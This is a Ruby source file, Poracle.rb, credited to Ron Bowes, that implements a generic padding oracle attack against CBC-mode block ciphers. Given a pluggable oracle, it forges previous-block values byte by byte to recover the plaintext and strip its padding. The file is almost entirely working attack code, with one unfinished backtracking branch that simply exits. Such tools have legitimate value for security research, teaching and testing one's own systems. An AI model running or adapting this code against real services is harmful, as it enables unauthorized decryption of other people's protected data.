##
# Poracle.rb
# Created: December 8, 2012
# By: Ron Bowes
#
# This class implements a simple Padding Oracle attack. It requires a 'module',
# which implements a couple simple methods:
#
# NAME
#  A constant representing the name of the module, used for output.
#
# blocksize()
#  The blocksize of whatever cipher is being used, in bytes (eg, # 16 for AES,
#  8 for DES, etc)
#
# iv()
#  The initialization vector used for the encryption. If this isn't given, the
#  first block can't be decrypted
#
# attempt_decrypt(data)
#  Attempt to decrypt the given data, and return true if there was no
#  padding error and false if a padding error occured.
#
# See LocalTestModule.rb and RemoteTestModule.rb for examples of how this can
# be made.
##
#

require 'hex'

class Poracle
  attr_accessor :verbose
  attr_reader :guesses

  def strclean(str)
    newstr = ''

    str.each_char do |c|
      if(ord(c) < 0x20 || ord(c) > 0x7E)
        newstr += "."
      else
        newstr += c
      end
    end

    return newstr
  end

  def ord(c)
    if(c.is_a?(Fixnum))
      return c
    end
    return c.unpack('C')[0]
  end

  def initialize(mod)
    @module = mod
    @verbose = false
    @guesses = 0
  end

  def find_character(character, block, previous, plaintext)
    # First, generate a good C' (C prime) value, which is what we're going to
    # set the previous block to. It's the plaintext we have so far, XORed with
    # the expected padding, XORed with the previous block
    blockprime = "\0" * @module.blocksize
    (@module.blocksize - 1).step(character + 1, -1) do |i|
      blockprime[i] = (ord(plaintext[i]) ^ (@module.blocksize - character) ^ ord(previous[i])).chr
    end

    # Try all possible characters
    ord(blockprime[character]).upto(255) do |i|
      blockprime[character] = i.chr


      result = @module.attempt_decrypt(blockprime + block)
      @guesses = @guesses + 1

      if(result)
        return (ord(blockprime[character]) ^ (@module.blocksize - character) ^ ord(previous[character])).chr
      end
    end
  end

  def do_block(block, previous)
    result = "?" * block.length

    plaintext  = "?" * @module.blocksize

    # Loop through the string from the end to the beginning
    character = block.length - 1
    while(character >= 0) do
      # When character is below 0, we've arrived at the beginning of the string
      if(character >= block.length)
        raise("Could not decode!")
      end

      c = find_character(character, block, previous, plaintext)
      if(c)
        plaintext[character] = c
        character -= 1
      else
        character += 1
        puts("TODO: Backtrack")
        exit
      end
    end

    return plaintext
  end

  def decrypt
    # Get the IV, defaulting to a NULL IV if we don't have one
    iv = @module.iv
    if(iv.nil?)
      iv = "\x00" * @module.blocksize
    end

    if(@verbose)
      # Create the @output_state variable, which will be purely for output
      @output_state = '?' * @module.data.length
    end

    # Add the IV to the start of the encrypted string (for simplicity)
    data  = iv + @module.data
    blockcount = data.length / @module.blocksize

    # Validate the blocksize
    if(data.length % @module.blocksize != 0)
      puts("Encrypted data isn't a multiple of the blocksize! Is this a block cipher?")
    end

    # Tell the user what's going on
    if(@verbose)
      puts("> Starting Poracle decrypter with module #{@module.class::NAME}")
      puts(">> Encrypted length: %d" % data.length)
      puts(">> Blocksize: %d" % @module.blocksize)
      puts(">> %d blocks:" % blockcount)
    end

    blocks = data.unpack("a#{@module.blocksize}" * blockcount)
    i = 0
    blocks.each do |b|
      i = i + 1
      if(@verbose)
        puts(">>> Block #{i}: #{b.unpack("H*")}")
      end
    end

    # Decrypt all the blocks - from the last to the first (after the IV)
    result = ''
    (blocks.size - 1).step(1, -1) do |i|
      new_result = do_block(blocks[i], blocks[i - 1])
      if(new_result.nil?)
        return nil
      end
      result = new_result + result
    end

    # Validate and remove the padding
    pad_bytes = result[result.length - 1].chr
    if(result[result.length - ord(pad_bytes), result.length - 1] != pad_bytes * ord(pad_bytes))
      puts("Bad padding!")
      return nil
    end

    result = result[0, result.length - ord(pad_bytes)]

    return result
  end
end
